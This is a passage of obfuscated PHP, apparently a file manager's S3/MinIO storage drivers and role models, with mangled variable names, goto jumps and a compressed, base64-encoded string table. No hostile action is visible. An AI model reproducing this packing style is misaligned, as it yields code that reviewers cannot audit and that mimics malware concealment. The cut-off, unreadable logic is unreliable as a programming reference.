$this->client->getObject($this->bucket, $ãÀ‚·ıø, array($_SERVER[÷åé¼î][244] => "\x62\171\164\x65\x73\x3d{$íüò™öÉ}\55{$¤ÃÇ»¦‡}")); } public function upload($ŠßşµÆ, $Ü€¤ô³ë, $Ö÷™°úâ = false, $ÅÜ·õèì = REPEAT_REPLACE) { $ÏÊ—çß =& $_SERVER[÷åé¼î]; $ñáßŸÓ¼ = array($ÏÊ—çß[245] => @md5_file($Ü€¤ô³ë)); $Ê ¾û…© = array($ÏÊ—çß[246] => get_file_mime(get_path_ext($ŠßşµÆ))); if (IO::size($Ü€¤ô³ë) <= 1024 * 1024 * 200) { $‰Ş‹ª‚ = $this->client->putObjectFile($Ü€¤ô³ë, $this->bucket, $ŠßşµÆ, $ÏÊ—çß[229], $ñáßŸÓ¼, $Ê ¾û…©); return !empty($‰Ş‹ª‚) ? $this->getPathOuter($ŠßşµÆ) : !1; } $£¢ÒÄøî = $this->client->multiUploadObject($Ü€¤ô³ë, $this->bucket, trim($ŠßşµÆ, $ÏÊ—çß[8]), $ñáßŸÓ¼, $Ê ¾û…©); return $£¢ÒÄøî ? $this->getPathOuter($ŠßşµÆ) : !1; } public function download($œµ®¯«ø, $öØ´£•Ú) { if (!@is_dir($this->pathFather($öØ´£•Ú)) && !IO::mkdir($this->pathFather($öØ´£•Ú))) { return !1; } $¼öú£ = $this->client->getObject($this->bucket, $œµ®¯«ø, array(), $öØ´£•Ú); return $¼öú£ !== !1 ? $öØ´£•Ú : !1; } public function link($î…ÉÖŸ‚, $ïÕßÄí = array()) { $ıô¿´ß® =& $_SERVER[÷åé¼î]; if ($this->signVer == $ıô¿´ß®[247]) { return $this->client->getAuthenticatedURL($this->bucket, $î…ÉÖŸ‚, 3600 * 12, $ïÕßÄí); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($î…ÉÖŸ‚, $ıô¿´ß®[8]), 3600 * 12, $this->region, array(), !0, $ïÕßÄí); } public function fileOut($üÌâô¹, $”íÌ ã£ = false, $Ó¥ô¡ì = false, $±¥»àØ­ = '') { $âÖğÍ  =& $_SERVER[÷åé¼î]; if ($this->isFileOutServer()) { return $this->fileOutServer($üÌâô¹, $”íÌ ã£, $Ó¥ô¡ì, $±¥»àØ­); } if (!$Ó¥ô¡ì) { $Ó¥ô¡ì = $this->pathThis($üÌâô¹); } $İ§ ĞúŒ = get_file_mime(get_path_ext($Ó¥ô¡ì)); if ($İ§ ĞúŒ == $âÖğÍ [248]) { return parent::fileOut($üÌâô¹, $”íÌ ã£, $Ó¥ô¡ì, $±¥»àØ­); } $îÇŞšûÏ = array($âÖğÍ [249] => $İ§ ĞúŒ); if ($”íÌ ã£) { $îÇŞšûÏ[$âÖğÍ [250]] = $âÖğÍ [251] . rawurlencode($Ó¥ô¡ì); } else { } $éŠ›ØµÀ = $this->link($üÌâô¹, $îÇŞšûÏ); $this->fileOutLink($éŠ›ØµÀ); } public function fileOutServer($´Ì¾öœ, $úŞà†ùØ = false, $ÏŸÜÌ«™ = false, $áğ»ƒä = '') { parent::fileOut($´Ì¾öœ, $úŞà†ùØ, $ÏŸÜÌ«™, $áğ»ƒä); } public function fileOutImageServer($ì—–áëÚ, $ù¹­„Õû = 250) { parent::fileOutImage($ì—–áëÚ, $ù¹­„Õû); } public function hashMd5($é«½Ô’Ú, $âÃ¢‹‚ = '') { $×œæá = $this->objectMeta($é«½Ô’Ú); if (!$×œæá) { return !1; } $âÃ¢‹‚ = $âÃ¢‹‚ ? $âÃ¢‹‚ : _get($×œæá, $_SERVER[÷åé¼î][252]); return $âÃ¢‹‚; } public function uploadFormData($èõˆË‚±, $ÉùÅĞû¿ = 3600) { $¼ÆœÌïõ =& $_SERVER[÷åé¼î]; $‰¶¡ô²ø = $this->pathFather($èõˆË‚±); $úŒ­ôˆç = $this->client->getHttpUploadPostParams($this->bucket, $‰¶¡ô²ø, $¼ÆœÌïõ[229], $ÉùÅĞû¿); return array_merge((array) $úŒ­ôˆç, array($¼ÆœÌïõ[208] => $this->getHost())); } public function multiUploadFormData($Üèù—ôî, $¸ˆÌÌ ‹ = 3600) { $Æ€»¦Ö =& $_SERVER[÷åé¼î]; $‘ÆÑîÇü = gmdate($Æ€»¦Ö[253]); $†¹ğàÏ– = array(); $¼Á´ªí— = $this->client->getUploadId($this->bucket, $Üèù—ôî, $†¹ğàÏ–); if (!$¼Á´ªí—) { return !1; } return array($Æ€»¦Ö[254] => $¼Á´ªí—, $Æ€»¦Ö[208] => $this->getHost() . $Æ€»¦Ö[8] . $this->pathEncode($Üèù—ôî), $Æ€»¦Ö[255] => $‘ÆÑîÇü, $Æ€»¦Ö[97] => $Üèù—ôî); } public function multiUploadAuthData($œîÉã°ò, $Ùá´Ññ‘ = array()) { $ËüµäïÇ =& $_SERVER[÷åé¼î]; $ª‰ÄÚ‰Ö = isset($Ùá´Ññ‘[$ËüµäïÇ[255]]) ? $Ùá´Ññ‘[$ËüµäïÇ[255]] : gmdate($ËüµäïÇ[253]); $¶øÚ¿È¨ = isset($Ùá´Ññ‘[$ËüµäïÇ[169]]) ? $Ùá´Ññ‘[$ËüµäïÇ[169]] : $ËüµäïÇ[12]; $û´ ¥ÒŞ = $Ùá´Ññ‘[$ËüµäïÇ[97]]; unset($Ùá´Ññ‘[$ËüµäïÇ[97]]); if (isset($Ùá´Ññ‘[$ËüµäïÇ[256]])) { $Ùá´Ññ‘[$ËüµäïÇ[255]] = $ª‰ÄÚ‰Ö; return $this->listUploadParts($û´ ¥ÒŞ, $Ùá´Ññ‘); } $³£ÓÉ° = array($ËüµäïÇ[257], $ËüµäïÇ[12], $ËüµäïÇ[123], $ËüµäïÇ[12], "\x78\x2d\x61\x6d\172\55\x64\141\x74\145\72{$ª‰ÄÚ‰Ö}", $ËüµäïÇ[8] . $this->bucket . $ËüµäïÇ[8] . $this->pathEncode($û´ ¥ÒŞ) . $¶øÚ¿È¨); if (strpos($¶øÚ¿È¨, $ËüµäïÇ[258]) === 0) { $³£ÓÉ°[0] = $ËüµäïÇ[259]; } if (isset($Ùá´Ññ‘[$ËüµäïÇ[260]]) && $Ùá´Ññ‘[$ËüµäïÇ[260]] == $ËüµäïÇ[261]) { $³£ÓÉ°[0] = $ËüµäïÇ[261]; } $Ôé» è = implode($ËüµäïÇ[262], $³£ÓÉ°); $Òâ‰é» = base64_encode(hash_hmac($ËüµäïÇ[263], $Ôé» è, $this->secret, !0)); $×±ğÍ°æ = $ËüµäïÇ[264] . $this->accessKey . $ËüµäïÇ[4] . $Òâ‰é»; if (strpos($¶øÚ¿È¨, $ËüµäïÇ[258]) === 0) { return array($ËüµäïÇ[265] => $×±ğÍ°æ, $ËüµäïÇ[255] => $ª‰ÄÚ‰Ö); } return $×±ğÍ°æ; } public function listUploadParts($¦×¼…š, $ĞäÜäàå = array()) { $·Ø±°åã =& $_SERVER[÷åé¼î]; $óµŞ¥å = str_replace($·Ø±°åã[266], $·Ø±°åã[12], $ĞäÜäàå[$·Ø±°åã[169]]); $°Èà’ = $this->client->listParts($this->bucket, $¦×¼…š, $óµŞ¥å); if (!$°Èà’) { return !1; } unset($ĞäÜäàå[$·Ø±°åã[256]], $ĞäÜäàå[$·Ø±°åã[260]]); $ĞäÜäàå[$·Ø±°åã[97]] = $¦×¼…š; $¬Ä“Šå± = $this->multiUploadAuthData($¦×¼…š, $ĞäÜäàå); if (empty($¬Ä“Šå±)) { return !1; } return array($·Ø±°åã[265] => $¬Ä“Šå±, $·Ø±°åã[255] => $ĞäÜäàå[$·Ø±°åã[255]], $·Ø±°åã[267] => $°Èà’); } public function getHost() { $ô«Ğøª =& $_SERVER[÷åé¼î]; $© Ä¾ô = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ô«Ğøª[70], $ô«Ğøª[64], $ô«Ğøª[69], $ô«Ğøª[62]))) { return $© Ä¾ô . $ô«Ğøª[8] . $this->bucket; } $© Ä¾ô = explode($ô«Ğøª[210], $© Ä¾ô); return $© Ä¾ô[0] . $ô«Ğøª[210] . $this->bucket . $ô«Ğøª[10] . $© Ä¾ô[1]; } public function size($ãã©‡Ê) { $çï”Š² = $this->objectMeta($ãã©‡Ê); return $çï”Š² ? $çï”Š²[$_SERVER[÷åé¼î][79]] : 0; } public function info($ç…ÎÏ½µ) { if ($this->isFolder($ç…ÎÏ½µ)) { return $this->folderInfo($ç…ÎÏ½µ); } else { if ($this->isFile($ç…ÎÏ½µ)) { return $this->fileInfo($ç…ÎÏ½µ); } } return !1; } public function exist($—èåìˆ¿) { return $this->isFile($—èåìˆ¿) || $this->isFolder($—èåìˆ¿); } public function isFile($˜ ›ƒú¬) { return !$this->isFolder($˜ ›ƒú¬) && $this->objectMeta($˜ ›ƒú¬); } public function isFolder($ÒÑ³ÉÊ×) { return $this->cacheMethod($_SERVER[÷åé¼î][179], $ÒÑ³ÉÊ×); } protected function objectMeta($Ú˜Ø”‘ğ) { return $this->cacheMethod($_SERVER[÷åé¼î][181], $Ú˜Ø”‘ğ); } protected function _objectMeta($–œéÜ‹ ) { $«Ñ€ËÚ“ =& $_SERVER[÷åé¼î]; $–œéÜ‹  = rtrim($–œéÜ‹ , $«Ñ€ËÚ“[8]); try { $ıĞ¤ú× = $this->client->getObjectInfo($this->bucket, $–œéÜ‹ ); if (!isset($ıĞ¤ú×[$«Ñ€ËÚ“[252]]) && isset($ıĞ¤ú×[$«Ñ€ËÚ“[268]])) { $ıĞ¤ú×[$«Ñ€ËÚ“[252]] = $ıĞ¤ú×[$«Ñ€ËÚ“[268]]; } } catch (Exception $Í–Ëµúî) { $ıĞ¤ú× = !1; } if (!$ıĞ¤ú×) { } return $ıĞ¤ú×; } protected function _isFolder($ç½¾òô) { $ô‡ˆ›Û =& $_SERVER[÷åé¼î]; $ç½¾òô = rtrim($ç½¾òô, $ô‡ˆ›Û[8]); if ($ç½¾òô == $ô‡ˆ›Û[12] || $ç½¾òô == $ô‡ˆ›Û[8]) { return !0; } $¢›Ÿæî¯ = $this->client->getBucket($this->bucket, $ç½¾òô, null, 1); if (empty($¢›Ÿæî¯[$ô‡ˆ›Û[236]])) { return !1; } $ö€Í‹Ê§ = $¢›Ÿæî¯[$ô‡ˆ›Û[236]][0][$ô‡ˆ›Û[32]]; return stripos($ö€Í‹Ê§, $ç½¾òô . $ô‡ˆ›Û[8]) === 0 ? !0 : !1; if (substr($ö€Í‹Ê§, -1) == $ô‡ˆ›Û[8]) { return !0; } if (get_path_this($ö€Í‹Ê§) == get_path_this($ç½¾òô)) { return !1; } return !0; } public function listObject($àÜ…Íñ®) { return $this->fileList($àÜ…Íñ®, $_SERVER[÷åé¼î][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ÀşÖ©ï) { $ªë¯³Ùì =& $_SERVER[÷åé¼î]; parent::__construct($ÀşÖ©ï); $this->setSignVersion($ªë¯³Ùì[247]); if (!$this->region) { $this->region = $ªë¯³Ùì[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $µÍüì«à = $this->getBucketRgn(); return $this->region == $µÍüì«à ? !0 : !1; } public function uploadFormData($ë°¶õ¥, $¤í‹­¡Ş = 3600) { $äÛË¢Ü =& $_SERVER[÷åé¼î]; $±ÈŸ´÷ = $äÛË¢Ü[229]; $Øãºø«ˆ = $äÛË¢Ü[270]; $£ŸÆ¼é¨ = $äÛË¢Ü[62]; $¤¼“Îİä = gmdate($äÛË¢Ü[271]); $²İóê˜ = gmdate($äÛË¢Ü[272]); $ßæîùäŠ = $äÛË¢Ü[273]; $ôñŒÉ³ = $¤í‹­¡Ş . $äÛË¢Ü[12]; $›·ò¤îÍ = $äÛË¢Ü[274]; $•ÑôÕòô = array($this->accessKey, $²İóê˜, $this->region, $£ŸÆ¼é¨, $ßæîùäŠ); $±‡¯òŒà = implode($äÛË¢Ü[8], $•ÑôÕòô); $ÃëÃøÌô = array($äÛË¢Ü[275] => gmdate($äÛË¢Ü[276], strtotime($äÛË¢Ü[277])), $äÛË¢Ü[278] => array(array($äÛË¢Ü[279] => $this->bucket), array($äÛË¢Ü[280] => $±ÈŸ´÷), array($äÛË¢Ü[281], $äÛË¢Ü[282], $äÛË¢Ü[12]), array($äÛË¢Ü[281], $äÛË¢Ü[283], $äÛË¢Ü[12]), array($äÛË¢Ü[281], $äÛË¢Ü[284], $äÛË¢Ü[12]), array($äÛË¢Ü[285] => $›·ò¤îÍ), array($äÛË¢Ü[286] => $±‡¯òŒà), array($äÛË¢Ü[287] => $Øãºø«ˆ), array($äÛË¢Ü[288] => $¤¼“Îİä), array($äÛË¢Ü[289] => $ôñŒÉ³))); $ÍÌ†˜¹° = base64_encode(json_encode($ÃëÃøÌô)); $ËØÓ“«¦ = hash_hmac($äÛË¢Ü[290], $²İóê˜, $äÛË¢Ü[291] . $this->secret, !0); $ÊÁŒéä = hash_hmac($äÛË¢Ü[290], $this->region, $ËØÓ“«¦, !0); $ú´”•ê§ = hash_hmac($äÛË¢Ü[290], $£ŸÆ¼é¨, $ÊÁŒéä, !0); $ÌŞõá”¨ = hash_hmac($äÛË¢Ü[290], $ßæîùäŠ, $ú´”•ê§, !0); $ÄÇáÀÌ = hash_hmac($äÛË¢Ü[290], $ÍÌ†˜¹°, $ÌŞõá”¨); $öˆ™Ú›À = array($äÛË¢Ü[246] => $äÛË¢Ü[12], $äÛË¢Ü[292] => $äÛË¢Ü[12], $äÛË¢Ü[280] => $±ÈŸ´÷, $äÛË¢Ü[285] => $›·ò¤îÍ, $äÛË¢Ü[293] => $ÍÌ†˜¹°, $äÛË¢Ü[294] => $±‡¯òŒà, $äÛË¢Ü[295] => $Øãºø«ˆ, $äÛË¢Ü[296] => $¤¼“Îİä, $äÛË¢Ü[297] => $ôñŒÉ³, $äÛË¢Ü[298] => $ÄÇáÀÌ, $äÛË¢Ü[208] => $this->getHost()); return $öˆ™Ú›À; } } goto C£áî¡ñï; C‡‡Â˜èëÆ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\145\155\x5f\157\160\164\x69\157\156"; protected $jsonField = array("\x6d\x65\156\x75", "\162\157\x6c\145", "\162\x6f\x6c\x65\x47\x72\x6f\x75\x70", "\x72\x65\147\x69\x73\x74", "\x65\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($Š¤ùùØë) { return "\x53\171\163\164\x65\155\117\160\x74\151\157\x6e\137{$Š¤ùùØë}"; } protected function optionDefault($ªˆ¡½ƒ = '') { $§ş·‚² =& $_SERVER[÷åé¼î]; if ($ªˆ¡½ƒ == $§ş·‚²[12]) { return $GLOBALS[$§ş·‚²[6]][$§ş·‚²[441]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\x2e\162\x6f\154\x65\114\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\141\165\x74\150", "\154\x61\142\x65\x6c", "\x64\x69\163\160\154\x61\x79", "\x73\x79\163\x74\145\155", "\x64\x65\163\143", "\x69\147\x6e\x6f\162\x65\105\170\x74", "\151\x67\156\157\162\x65\106\151\154\x65\x53\151\172\145", "\x61\x64\155\x69\156\x69\x73\x74\x72\x61\x74\157\x72", "\x73\157\x72\x74"); public function listData($æÑåĞ±¢ = false, $ƒö€áˆ = "\163\x6f\162\164", $¡’ÎÅßµ = false) { $ÏÔêØ´ =& $_SERVER[÷åé¼î]; $ÕóŒÉ€ù = parent::listData($æÑåĞ±¢, $ƒö€áˆ, $¡’ÎÅßµ); if (!$æÑåĞ±¢) { foreach ($ÕóŒÉ€ù as $‡şÕ´ó => $÷ôÂî¨) { if ($÷ôÂî¨[$ÏÔêØ´[2184]] == 1) { $ÕóŒÉ€ù[$‡şÕ´ó][$ÏÔêØ´[510]] = LNG($ÏÔêØ´[2445]); } } } return $ÕóŒÉ€ù; } public function update($Ôô‚êØ, $à‘±ÏÍÌ) { $ëÛÀªˆä =& $_SERVER[÷åé¼î]; $—òÉ¾—‘ = parent::listData($Ôô‚êØ); $İÉÎ¬• = $this->findByName($à‘±ÏÍÌ[$ëÛÀªˆä[32]]); if (!$—òÉ¾—‘ || $İÉÎ¬• && $İÉÎ¬•[$ëÛÀªˆä[459]] != $—òÉ¾—‘[$ëÛÀªˆä[459]]) { return !1; } if ($İÉÎ¬•[$ëÛÀªˆä[2184]] == 1) { $à‘±ÏÍÌ = array($ëÛÀªˆä[32] => $à‘±ÏÍÌ[$ëÛÀªˆä[32]], $ëÛÀªˆä[2000] => $à‘±ÏÍÌ[$ëÛÀªˆä[2000]]); } $this->filterAuth($à‘±ÏÍÌ[$ëÛÀªˆä[471]]); return parent::update($Ôô‚êØ, $à‘±ÏÍÌ); } public function remove($ÑšêÎ‹Ş) { $ÓÄõ·—ö = parent::listData($ÑšêÎ‹Ş); if (!$ÓÄõ·—ö || $ÓÄõ·—ö[$_SERVER[÷åé¼î][191]]) { return !1; } return parent::remove($ÑšêÎ‹Ş); } public function add($ÕÑÒ õ¼) { $„ŞäÇñ =& $_SERVER[÷åé¼î]; $„Ê÷æùâ = $ÕÑÒ õ¼[$„ŞäÇñ[32]]; if ($this->findByName($„Ê÷æùâ)) { return !1; } $¹Îãìõ÷ = array($„ŞäÇñ[478] => $„Ê÷æùâ, $„ŞäÇñ[1983] => $„ŞäÇñ[12], $„ŞäÇñ[1979] => $„ŞäÇñ[1987], $„ŞäÇñ[2446] => 1, $„ŞäÇñ[1982] => 0, $„ŞäÇñ[2447] => 0, $„ŞäÇñ[1981] => $this->getSort()); $ÕÑÒ õ¼ = array_merge($¹Îãìõ÷, $ÕÑÒ õ¼); $this->filterAuth($ÕÑÒ õ¼[$„ŞäÇñ[471]]); return parent::insert($ÕÑÒ õ¼); } private function getSort() { $ØÜá–åª =& $_SERVER[÷åé¼î]; $ÛÀğûİ¾ = parent::listData(); $È€·Ë÷ = array_to_keyvalue($ÛÀğûİ¾, $ØÜá–åª[12], $ØÜá–åª[2001]); return empty($È€·Ë÷) ? 0 : max($È€·Ë÷) + 1; } private function filterAuth(&$ Ÿ“°¹É) { $”°İŒŸŠ =& $_SERVER[÷åé¼î]; $äÔŒ¾ôÙ = array(); $Ô­ªüœù = array_filter(explode($”°İŒŸŠ[50], $ Ÿ“°¹É)); foreach ($Ô­ªüœù as $ Ÿ“°¹É) { $Üòß”¬¤ = explode($”°İŒŸŠ[10], $ Ÿ“°¹É); if ($Üòß”¬¤[0] == $”°İŒŸŠ[2448] && $Üòß”¬¤[1] != $”°İŒŸŠ[1269]) { $º—™–©Ü = $Üòß”¬¤[0] . $”°İŒŸŠ[10] . $Üòß”¬¤[1] . $”°İŒŸŠ[2449]; if (!in_array($º—™–©Ü, $Ô­ªüœù)) { $äÔŒ¾ôÙ[] = $º—™–©Ü; } } $äÔŒ¾ôÙ[] = $ Ÿ“°¹É; } $ Ÿ“°¹É = implode($”°İŒŸŠ[50], $äÔŒ¾ôÙ); } public function findRoleDefault() { $Éòİ¸‚ı =& $_SERVER[÷åé¼î]; $†æ—ó¼ƒ = parent::listData(); $íÕõÌÛÖ = !1; foreach ($†æ—ó¼ƒ as $¤á¸·Ù) { if (!$¤á¸·Ù || $¤á¸·Ù[$Éòİ¸‚ı[1999]] == $Éòİ¸‚ı[228] || $¤á¸·Ù[$Éòİ¸‚ı[2184]] == 1) { continue; } if (strstr($¤á¸·Ù[$Éòİ¸‚ı[471]], $Éòİ¸‚ı[2450])) { continue; } if (!strstr($¤á¸·Ù[$Éòİ¸‚ı[471]], $Éòİ¸‚ı[2451])) { continue; } if (!$íÕõÌÛÖ) { $íÕõÌÛÖ = $¤á¸·Ù; continue; } $ËŠııÒ = explode($Éòİ¸‚ı[50], $íÕõÌÛÖ[$Éòİ¸‚ı[471]]); $²ö•ú¢® = explode($Éòİ¸‚ı[50], $¤á¸·Ù[$Éòİ¸‚ı[471]]); if (count($ËŠııÒ) > count($²ö•ú¢®)) { $íÕõÌÛÖ = $¤á¸·Ù; } } return $íÕõÌÛÖ ? $íÕõÌÛÖ[$Éòİ¸‚ı[459]] : $Éòİ¸‚ı[12]; } public function sort($²›ÍÚ×ï, $·‚å¿ä) { return parent::update($²›ÍÚ×ï, $·‚å¿ä); } } goto E’¶¬¾ßòÃ; eàĞ¶’ÖÚ‚: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xf7\xe5\xe9\xbc\xee\x8f", base64_decode('+KegkJHN')); $_SERVER[÷åé¼î] = explode("\x7c\x4\x7c\x5\x7c\x1", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\265\160\51\264\145\337\13\274\122\140\60\111\154\47\132\154\147\167\342\44\262\54\333\42\262\145\44\71\233\155\46\43\151\54\115\54"."\x69\x64\xcd\xc8\x5b\x12\x76\xc2\x4e\xa0\xac\x65\x6f\x29\x5b\x69\x58\x4b\xd8\xa1\xd0\x42\xb\x85\x42\x5f\xb\xb4\xa5\x40\x4b\x63\x27\x14\x28\x5\x5a\x28\x6d\xa1\xff\x5d\xce\x5d\x66\x24\xc3\xfb\xbf\xf7\x7f\xdf"."\x1f\x48\x74\x97\x73\xef\xdc\xe5\xdc\x73\xcf\x3d\xf7\x9c\x73\x5f\xbc\xe6\x8d\xd7\x1e\xdd\xbe\x69\x8f\x4d\x5f\xd9\xb4\xdb\xd5\xcf\x9c\x7f\xef\xdd\x4f\xd2\x30\xfa\xf\xff\x92\xf0\x31\xe7\xed\xf9\x25\xf2\xe7\x90".base64_decode('886tq+tcsPec7n23/nCb9gPtNu2CaOTnz4X3+8UPjg9N3fjz8andvvTQLzd+rxkB07LN9A==')."\107\51\230\266\242\217\31\226\155\321\204\224\131\30\64\62\64\154\24\350\257\237\376\364\306\42\45\75\157\332\72\215\372\350\217\12\355\42\377\132\303\71\203\345\253\335\321\204\32\357\355\351"."\11\305\22\0\324\54\347\347\315\64\204\212\132\111\313\303\367\213\172\311\102\255\221\253\123\213\146\121\57\70\122\104\102\132\263\265\244\146\101\115\155\255\152\133\250\47\22\135\253\46\326\366".base64_decode('hAAiqQ6X9dI4jZFg3NZKdsLI6xxitMTb1RrqCHcriVigOx4IJsLRbpocjHZ1hROV6bFoJA==')."\xd2\x1a\x8\xae\xac\xcc\xe9\x89\x5\x3a\xba\x2\xa\x6a\x5f\x4e\x57\x8d\xc2\xa0\x59\xa7\xac\xa7\x39\xeb\x95\x7a\x1a\x68\x37\xf4\x5c\x9a\x6\xb\x1a\x6b\x8e\x3d\x5e\x84\x50\x82\x87\xd0\x34\x15\xca\xb9\x1c\x8d".base64_decode('dPNQWh/UyjkYrTY5UiwZeY11eqU+zlNpQCvbplFI0UhozC5pIh21NYUmWi9AVfFQJBRMKA==').base64_decode('uIFKeyzapcAk5DXL1kvK6s5QLKTgRrfUkr7WKoAv3WgolEAkokxXg63ni6waWqZKZdFYWw==')."\50\246\264\256\125\304\10\245\314\174\336\54\370\120\55\150\46\155\251\251\241\130\214\6\74\200\336\221\60\236\64\210\104\333\333\343\41\36\203\316\235\20\101\55\231\13\370\351\210\245\7\163".base64_decode('tjqi5coMTYfoby38wK9pAeoOGwWjDGgKVZgmX1YQKDNonaXoaQjkUXkTyiUhLcmgNrCAgQ==')."\126\350\10\15\266\54\243\277\113\240\174\122\305\171\172\311\126\365\102\312\114\33\5\130\307\313\1\37\65\73\333\126\62\20\0\215\17\232\271\64\13\133\306\4\364\162\320\310\351\335\345\274"."\xc\xc2\xa3\xa9\xac\x91\x4b\x97\xd8\xd2\xfb\x3c\x48\x1a\x8d\xf0\x95\x8c\x61\x45\xac\x88\x5a\xc2\x89\x80\x31\x38\x2e\x96\x22\x86\xeb\xe1\xb9\x96\x59\x2e\xa5\xf4\x30\x5a\x3a\x34\xde\x8\xc9\xba\x6d\xa3\xce\xb1".base64_decode('ATF7izlTS8f1Eu+aYbajiqJlW04sE7B2s5RvQ0QDvo8WjNFbJWOILZm0NGL+ur5TvZ8N9A==')."\255\100\377\324\3\125\354\207\66\145\365\134\116\325\307\164\130\123\371\364\174\213\15\206\337\112\32\5\77\112\241\321\160\124\315\152\126\266\53\75\137\45\245\30\261\115\353\143\276\142\266\10"."\13\236\257\361\176\7\316\343\241\353\66\355\220\104\262\163\146\112\313\311\135\244\341\254\155\27\343\172\41\215\107\2\272\142\216\26\310\110\25\165\35\200\332\74\112\132\351\122\326\52\235\315"."\x46\xb3\xc5\xa\xe6\x73\x3c\xc4\x7a\xc7\xd3\x2c\x9e\x68\x8f\xb1\xe9\x4c\xf\x2\xb6\xb2\x1d\xa3\x6\x3e\x68\x58\x84\xf8\x89\x95\xab\x15\x8b\x39\x23\xa5\xd9\x86\x59\xf0\x9b\x29\x5b\xb7\xbd\x96\x5d\xd2\x35\xa8".strrev('‹½¶Rİ™ŸÁÄ`¢Y®"Ã66˜½Ş´L£³+4(ÆFKFõÎ\\¼æd»š'."\r".'å–éJ1')."\330\342\344\320\45\255\140\15\352\45\157\10\126\106\263\202\32\313\11\44\3\153\63\254\242\151\31\270\171\315\212\146\333\132\52\213\211\213\250\276\345\163\340\215\102\316\50\350\225\260\250\22"."\335\333\123\322\62\171\255\131\51\226\223\150\0\140\101\102\132\12\103\310\300\60\0\315\112\136\33\363\152\31\126\123\150\254\150\224\164\213\365\132\351\350\112\0\106\15\172\273\360\102\62\364"."\xb4\x37\x8e\xa8\x37\x54\x36\xb7\x61\x9e\x82\x70\x45\x61\x79\x34\xb5\x33\x91\xe8\x51\xc3\xed\x68\x7b\xee\xe\xa9\x5d\x81\x44\xb0\x13\x6a\xb7\xb5\xc\xab\x3a\x82\x68\x32\xaf\x92\x25\xae\xf1\xa2\x5\x85\xb1\xa9"."\x1b\x75\x4e\x24\xf6\x98\xa3\x7a\x9\x7d\xb8\x75\xbc\x59\x19\x32\xd3\x49\x73\xcc\xc7\xb2\x30\x70\x1c\x51\x16\x6\x8c\xe7\xb7\x68\x7b\x63\x5a\x21\x83\xbb\x91\x1c\xb7\x75\xcb\x4d\x9b\x5a\xd1\x66\xee\x1b\xa4\xab"."\327\227\324\7\315\22\364\306\32\311\70\7\77\242\27\62\166\226\325\35\17\305\126\205\142\152\74\332\236\130\35\210\301\336\137\100\230\63\306\132\203\277\236\363\306\364\64\32\304\224\315\312".base64_decode('aUUx+mu8eMHgj7NcvIhYXiTcgceuzWshIK8MxeqOGHkDd8/mOWSwEWPQAQ3ykz639Fuz6w==')."\xfa\xd3\x73\xea\xbd\xe8\xdf\xd9\xf5\x7d\xfd\x6d\xbe\xd9\x3\xcb\xfd\x86\x28\xe3\x6f\xf4\x35\x2a\x4d\xd\xb\x94\x1e\xc4\xa9\x18\x5a\x4e\x81\x4e\x57\x40\x34\x28\xd1\x95\xce\x61\x11\x18\x6e\xa4\x51\xdc\xb0\xc7"."\253\56\56\204\114\246\245\173\73\165\15\21\152\64\31\216\271\361\260\357\321\370\347\214\60\336\57\45\172\342\232\33\232\30\13\235\320\33\212\47\324\256\120\242\63\332\6\135\10\5\40\124".base64_decode('QIVJm9k8Y+YMtsYCVKuPSfuI2A9S8qCQct3mKNsBXEgUzOqpoWnyUAh6Y1LaxKavj/4MAA==')."\106\17\320\37\325\260\332\245\275\23\107\71\215\125\315\344\6\204\135\135\72\333\110\340\113\341\74\132\307\242\345\252\163\243\143\335\352\22\330\216\226\315\152\43\315\167\102\24\355\324\215\114"."\x16\x1a\x6a\xe0\xea\x52\x66\xce\x2c\x69\x39\x4c\xff\x19\xf3\x9a\x31\x80\x14\x17\x73\x65\x84\xfb\x7e\x5c\x71\x22\x5b\xce\x27\x61\xb7\x42\x63\x94\xd1\x6d\xc1\x57\x5a\xe3\x88\xf9\xca\xb3\x5d\x19\x6d\xed\x76\xb8"."\xcd\xb1\xf7\x42\xcc\xaf\x62\x7c\xed\xf7\x15\xb\x99\xfa\x19\x50\x97\xda\x34\xbf\x1\x27\xc0\x34\x42\xcf\x10\x83\x5d\xd6\x2b\xbb\xee\x4b\x99\x68\x71\x77\x69\x43\x7a\x33\xee\xb\x50\xb4\x25\x24\x95\x45\x24\xa2"."\xb9\x4\xef\x73\x2d\x6e\xda\x80\xa7\x27\xe7\xcb\xa3\x4a\x48\x9d\x41\x93\xef\xcc\xf4\x8\xb3\xc4\xb9\xcf\x29\x7a\xa9\x64\x96\x8e\x5\x8\x12\x56\xc8\x66\x89\xa7\xb\x2a\xb7\x39\xeb\x61\x21\x32\xc0\xc2\x59\x93".base64_decode('syomQ8ZmP/R7ZlM7kI40Ytl8lo0mAXVQS6erJSNyAxVsYnhKMhgv4I/PRf+LjT9t5jW2jQ==')."\222\15\120\117\323\35\320\221\104\227\55\115\232\315\352\55\331\46\316\54\71\40\21\46\146\115\150\31\232\172\350\125\231\167\217\165\64\255\347\164\206\105\131\235\61\21\15\0\206\206\237\343"."\xd8\x20\x47\x76\x74\x4c\x40\xa9\x82\x7b\x33\xac\x18\x2a\x89\xb7\x7c\x16\x5f\x8d\xcf\x55\x22\x1\xf3\x3d\x80\x3c\x22\x98\x43\x53\x17\x25\xab\x46\xc4\x7b\x4a\xfa\xa0\x31\xc6\x8\xc4\x98\xdd\xa5\x95\x86\x58\xc7".strrev(' ¸/Â5ğ	¤e43&k8ÙA1Ø 